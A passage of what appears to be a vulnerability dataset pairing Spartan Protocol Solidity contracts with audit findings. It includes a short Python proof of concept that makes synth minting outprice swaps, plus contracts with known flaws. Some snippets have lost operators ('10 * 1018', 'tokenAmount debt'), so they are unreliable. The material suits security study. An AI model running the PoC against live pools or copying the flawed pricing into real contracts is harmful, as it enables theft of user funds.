Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n",
        "CodeNames": [
            "Dao.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-11",
                "Location": [
                    "//solidity\nuint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount);\n",
                    "//solidity\nuint256 _X = baseAmount;\nuint256 _Y = tokenAmount;\n_y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n",
                    "python\nfor i in range(10):\n    amount = 10 * 1018\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.swapTo(token.address, user).transact()\n",
                    "python\nfor i in range(10):\n    amount = 10 * 1018\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.mintSynth(token_synth.address, user).transact()\n",
                    "//solidity\nuint256 public debt;\nfunction _tokenAmount() returns (uint256) {\n    return tokenAmount debt;\n}\n\n// Swap SPARTA for Synths\nfunction mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n    require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n    uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n\n    // Use tokenAmount debt to calculate the value\n    uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n\n    // increment the debt\n    debt += output\n\n    uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n    _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n    uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n    fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n    _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n    iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n    _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n    emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n    return (output, fee);\n}\n"
                ],
                "Type": " Misuse of AMM model on minting  Synth  (resubmit to add more detail)",
                "Description": "\nPool calculates the amount to be minted based on token_amount and sparta_amount of the Pool. However, since token_amount in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.\n\nThe synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.\n\nIn Pool's mint synth(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242), The synth amount is calculated at L:232\nsolidity\nuint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount);\n\nwhich is the same as swapping base to token at L:287\nsolidity\nuint256 _X = baseAmount;\nuint256 _Y = tokenAmount;\n_y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n\n\nHowever, while swapping tokens decrease pool's token, mint just mint it out of the air.\n\nHere's a POC:\nSwap sparta to token for ten times\npython\nfor i in range(10):\n    amount = 10 * 1018\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.swapTo(token.address, user).transact()\n\n\nMint Synth for ten times\npython\nfor i in range(10):\n    amount = 10 * 1018\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.mintSynth(token_synth.address, user).transact()\n\n\nThe Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets 4744.4059 and the second case gets 6223.758.\n\n\nThe debt should be considered in the AMM pool so I recommend to maintain a debt variable in the Pool and use tokenAmount debt when the Pool calculates the token price. Here's some idea of it:\nsolidity\nuint256 public debt;\nfunction _tokenAmount() returns (uint256) {\n    return tokenAmount debt;\n}\n\n// Swap SPARTA for Synths\nfunction mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n    require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n    uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n\n    // Use tokenAmount debt to calculate the value\n    uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n\n    // increment the debt\n    debt += output\n\n    uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n    _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n    uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n    fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n    _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n    iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n    _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n    emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n    return (output, fee);\n}\n\n\nverifyfirst (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/59#issuecomment-883866084):\n  We agree with the issue submitted, discussions are already in progress around ensuring the mint rate considers the floating debt.\n Potential high risk, however, hard to create a scenario to prove this.\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iSYNTH.sol\"; \nimport \"./interfaces/iSYNTHFACTORY.sol\"; \nimport \"./interfaces/iBEP677.sol\"; \n\ncontract Pool is iBEP20 {  \n    address public BASE;\n    address public TOKEN;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint256 public baseAmount; // SPARTA amount that should be in the pool\n    uint256 public tokenAmount; // TOKEN amount that should be in the pool\n\n    uint private lastMonth; // Timestamp of the start of current metric period (For UI)\n    uint public genesis; // Timestamp from when the pool was first deployed (For UI)\n\n    uint256 public map30DPoolRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DPoolRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    event AddLiquidity(address indexed member, uint inputBase, uint inputToken, uint unitsIssued);\n    event RemoveLiquidity(address indexed member, uint outputBase, uint outputToken, uint unitsClaimed);\n    event Swapped(address indexed tokenFrom, address indexed tokenTo, address indexed recipient, uint inputAmount, uint outputAmount, uint fee);\n    event MintSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n    event BurnSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    constructor (address _base, address _token) {\n        BASE = _base;\n        TOKEN = _token;\n        string memory poolName = \"-SpartanProtocolPool\";\n        string memory poolSymbol = \"-SPP\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), poolName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), poolSymbol));\n        decimals = 18;\n        genesis = block.timestamp;\n        DEPLOYER = msg.sender;\n        lastMonth = 0;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Max approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n      iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n      return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n      return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //====================================POOL FUNCTIONS =================================//\n\n    // User adds liquidity to the pool\n    function add() external returns(uint liquidityUnits){\n        liquidityUnits = addForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Contract adds liquidity for user \n    function addForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get the received SPARTA amount\n        uint256 _actualInputToken = _getAddedTokenAmount(); // Get the received TOKEN amount\n        if(baseAmount == 0 || tokenAmount == 0){\n        require(_actualInputBase != 0 && _actualInputToken != 0, \"!Balanced\");\n        }\n        liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply); // Calculate LP tokens to mint\n        _incrementPoolBalances(_actualInputBase, _actualInputToken); // Update recorded BASE and TOKEN amounts\n        _mint(member, liquidityUnits); // Mint the LP tokens directly to the user\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n    \n    // User removes liquidity from the pool \n    function remove() external returns (uint outputBase, uint outputToken) {\n        return removeForMember(msg.sender);\n    } \n\n    // Contract removes liquidity for the user\n    function removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n        outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n        outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n        _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n        _burn(address(this), _actualInputUnits); // Burn the LP tokens\n        iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n        iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n        emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n        return (outputBase, outputToken);\n    }\n\n    // Caller swaps tokens\n    function swap(address token) external returns (uint outputAmount, uint fee){\n        (outputAmount, fee) = swapTo(token, msg.sender);\n        return (outputAmount, fee);\n    }\n\n    // Contract swaps tokens for the member\n    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"!BASE||TOKEN\"); // Must be SPARTA or the pool's relevant TOKEN\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN; // If SPARTA is selected; swap from TOKEN\n            _amount = _getAddedTokenAmount(); // Get the received TOKEN amount\n            (outputAmount, fee) = _swapTokenToBase(_amount); // Calculate the SPARTA output from the swap\n        } else {\n            _fromToken = BASE; // If TOKEN is selected; swap from SPARTA\n            _amount = _getAddedBaseAmount(); // Get the received SPARTA amount\n            (outputAmount, fee) = _swapBaseToToken(_amount); // Calculate the TOKEN output from the swap\n        }\n        emit Swapped(_fromToken, token, member, _amount, outputAmount, fee);\n        iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user\n        return (outputAmount, fee);\n    }\n\n    // Swap SPARTA for Synths\n    function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n        uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n        uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n        _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n        uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n        fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n        _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n        iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n      return (output, fee);\n    }\n    \n    // Swap Synths for SPARTA\n    function burnSynth(address synthIN, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthIN) == true, \"!synth\"); // Must be a valid Synth\n        uint _actualInputSynth = iBEP20(synthIN).balanceOf(address(this)); // Get received SYNTH amount\n        uint outputBase = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputSynth, tokenAmount, baseAmount); // Calculate value of swapping relevant underlying TOKEN to SPARTA\n        fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputSynth, tokenAmount, baseAmount); // Calc slip fee in SPARTA\n        iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract\n        iSYNTH(synthIN).burnSynth(); // Burn the SYNTH units\n        _decrementPoolBalances(outputBase, 0); // Update recorded SPARTA amount\n        iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit BurnSynth(member, BASE, outputBase, TOKEN, _actualInputSynth);\n      return (outputBase, fee);\n    }\n\n    //=======================================INTERNAL MATHS======================================//\n\n    // Check the SPARTA amount received by this Pool\n    function _getAddedBaseAmount() internal view returns(uint256 _actual){\n        uint _baseBalance = iBEP20(BASE).balanceOf(address(this)); \n        if(_baseBalance > baseAmount){\n            _actual = _baseBalance-(baseAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n  \n    // Check the TOKEN amount received by this Pool\n    function _getAddedTokenAmount() internal view returns(uint256 _actual){\n        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); \n        if(_tokenBalance > tokenAmount){\n            _actual = _tokenBalance-(tokenAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    // Calculate output of swapping SPARTA for TOKEN & update recorded amounts\n    function _swapBaseToToken(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = baseAmount;\n        uint256 _Y = tokenAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n        uint fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc TOKEN fee\n        _fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, fee); // Convert TOKEN fee to SPARTA\n        _setPoolAmounts(_X + _x, _Y - _y); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    // Calculate output of swapping TOKEN for SPARTA & update recorded amounts\n    function _swapTokenToBase(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = tokenAmount;\n        uint256 _Y = baseAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc SPARTA output\n        _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc SPARTA fee\n        _setPoolAmounts(_Y - _y, _X + _x); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    //=======================================BALANCES=========================================//\n\n    // Sync internal balances to actual\n    function sync() external {\n        baseAmount = iBEP20(BASE).balanceOf(address(this));\n        tokenAmount = iBEP20(TOKEN).balanceOf(address(this));\n    }\n\n    // Increment internal balances\n    function _incrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount += _baseAmount;\n        tokenAmount += _tokenAmount;\n    }\n\n    // Set internal balances\n    function _setPoolAmounts(uint256 _baseAmount, uint256 _tokenAmount) internal  {\n        baseAmount = _baseAmount;\n        tokenAmount = _tokenAmount; \n    }\n\n    // Decrement internal balances\n    function _decrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount -= _baseAmount;\n        tokenAmount -= _tokenAmount; \n    }\n\n    //===========================================POOL FEE ROI=================================//\n\n    function _addPoolMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30Days\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DPoolRevenue = map30DPoolRevenue;\n            addRevenue(mapPast30DPoolRevenue);\n            map30DPoolRevenue = 0;\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n",
        "CodeNames": [
            "Pool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-12",
                "Location": [
                    "addForMember",
                    "mintSynth",
                    "calcLiquidityHoldings"
                ],
                "Type": " wrong  calcLiquidityHoldings  that leads to dead fund in the Pool",
                "Description": "\nThe lptoken minted by the Pool contract is actually the mix of two types of tokens. One is the original lptokens user get by calling addForMember. This lpToken is similar to lp of Uniswap, Crv, Sushi, ... etc. The other one is the debt-lp token the Synth contract will get when the user calls mintSynth. The Synth contract can only withdraw Sparta for burning debt-lp. Mixing two types of lp would raise several issues.\n\nLP user would not get their fair share when they burn the lP.\n1. Alice adds liquidity with Sparta 1000 and token B 1000 and create a new Pool.\n2. Bob mint Synth with 1000 Sparta and get debt.\n3. Alice withdraw all lp Token\n4. Bob burn all Synth.\n\nThe pool would end up left behind a lot of token B in the Pool while there's no lp holder.\n\nI would say this is a high-risk vulnerability since it pauses unspoken risks and losses for all users (all the time)\n\nThe logic of burn original lp(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L192-L202) and burn debt-lp(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L244-L257).\n\nI do not know whether this is the team's design choice or its composite with a series of bugs. If this is the original design, I do not come up with a fix. It's a bit similar to the impermanent loss. However, the loss would be left behind in the Pool. This is more complicated and maybe worse than the impermanent loss. If this is the design choice, I think it's worth emphasize and explain to the users.\n\nverifyfirst (Spartan) confirmed and disagreed with severity(https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-884588473):\n  We are in discussion of a viable solution to limit the effects of a bank run.\n One example is limiting the minted synths based on the depth of its underlying pool.\n\n\nSamusElderg (Spartan) commented(https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-892408842):\n  LP units are only used for accounting; even if they were drained to zero or vice versa on the synth contract; they would result in the same redemption value when burning. Hence the risk is low; however there is already discussions on implementing controls to synths including a maximum synthSupply vs tokenDepth ratio to prevent top-heavy synths ontop of the pools which isn't really specific to the warden's scenario; however does help limit those 'unknowns' that the warden addressed.\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract BondVault {\n    address public BASE;\n    address public DEPLOYER;\n    uint256 public totalWeight;\n    bool private bondRelease;\n    address [] public arrayMembers;\n\n    struct ListedAssets {\n        bool isListed;\n        address[] members;\n        mapping(address => bool) isMember;\n        mapping(address => uint256) bondedLP;\n        mapping(address => uint256) claimRate;\n        mapping(address => uint256) lastBlockTime;\n    }\n    struct MemberDetails {\n        bool isMember;\n        uint256 bondedLP;\n        uint256 claimRate;\n        uint256 lastBlockTime;\n    }\n\n    mapping(address => ListedAssets) public mapBondAsset_memberDetails;\n    mapping(address => uint256) private mapMember_weight; // Value of users weight (scope: user)\n    mapping(address => mapping(address => uint256)) private mapMemberPool_weight; // Value of users weight (scope: pool)\n\n    constructor (address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        bondRelease = false;\n    }\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() public onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Get the current DAO address as reported by the BASE contract\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // Deposit LPs in the BondVault for a user (Called from DAO)\n    function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){\n        if(!mapBondAsset_memberDetails[asset].isMember[member]){\n            mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)\n            arrayMembers.push(member); // Add user to member array (scope: vault)\n            mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)\n        }\n        if(mapBondAsset_memberDetails[asset].bondedLP[member] != 0){\n            claimForMember(asset, member); // Force claim if member has an existing remainder\n        }\n        mapBondAsset_memberDetails[asset].bondedLP[member] += LPS; // Add new deposit to users remainder\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].claimRate[member] = mapBondAsset_memberDetails[asset].bondedLP[member] / iDAO(_DAO().DAO()).bondingPeriodSeconds(); // Set claim rate per second\n        increaseWeight(asset, member); // Update user's weight\n        return true;\n    }\n\n    // Increase user's weight in the BondVault\n    function increaseWeight(address asset, address member) internal{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        if (mapMemberPool_weight[member][pool] > 0) {\n            totalWeight -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: vault)\n            mapMember_weight[member] -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: user)\n            mapMemberPool_weight[member][pool] = 0; // Zero out user weight (scope: user -> pool)\n        }\n        uint256 weight = iUTILS(_DAO().UTILS()).getPoolShareWeight(asset, mapBondAsset_memberDetails[asset].bondedLP[member]); // Calculate user's bonded weight\n        mapMemberPool_weight[member][pool] = weight; // Set new weight (scope: user -> pool)\n        mapMember_weight[member] += weight; // Add new weight to totalWeight (scope: user)\n        totalWeight += weight; // Add new weight to totalWeight (scope: vault)\n    }\n\n    // Calculate the user's current available claim amount\n    function calcBondedLP(address member, address asset) public view returns (uint claimAmount){ \n        if(mapBondAsset_memberDetails[asset].isMember[member]){\n            uint256 _secondsSinceClaim = block.timestamp - mapBondAsset_memberDetails[asset].lastBlockTime[member]; // Get seconds passed since last claim\n            uint256 rate = mapBondAsset_memberDetails[asset].claimRate[member]; // Get user's claim rate\n            claimAmount = _secondsSinceClaim * rate; // Set claim amount\n            if(claimAmount >= mapBondAsset_memberDetails[asset].bondedLP[member] || bondRelease){\n                claimAmount = mapBondAsset_memberDetails[asset].bondedLP[member]; // If final claim; set claimAmount as remainder\n            }\n            return claimAmount;\n        }\n    }\n\n    // Perform a claim of the users's current available claim amount\n    function claimForMember(address asset, address member) public onlyDAO returns (bool){\n        require(mapBondAsset_memberDetails[asset].bondedLP[member] > 0, '!bonded'); // They must have remaining unclaimed LPs\n        require(mapBondAsset_memberDetails[asset].isMember[member], '!member'); // They must be a member (scope: user -> asset)\n        uint256 _claimable = calcBondedLP(member, asset); // Get the current claimable amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get the pool address\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder\n        if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){\n            mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate\n        }\n        decreaseWeight(asset, member); // Update user's weight\n        iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user\n        return true;\n    }\n\n    // Decrease user's weight in the BondVault\n    function decreaseWeight(address asset, address member) internal {\n        address _pool = 